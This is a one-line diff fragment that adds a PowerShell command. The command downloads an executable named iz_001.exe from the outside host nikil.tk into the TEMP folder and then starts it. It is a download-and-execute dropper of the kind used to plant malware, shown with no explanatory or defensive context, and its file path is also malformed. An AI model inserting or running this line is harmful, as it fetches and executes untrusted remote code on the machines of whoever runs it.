@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/i1/iz_001.exe',"$env:TEMPiz_001.exe");Start-Process ("$env:TEMPiz_001.exe")
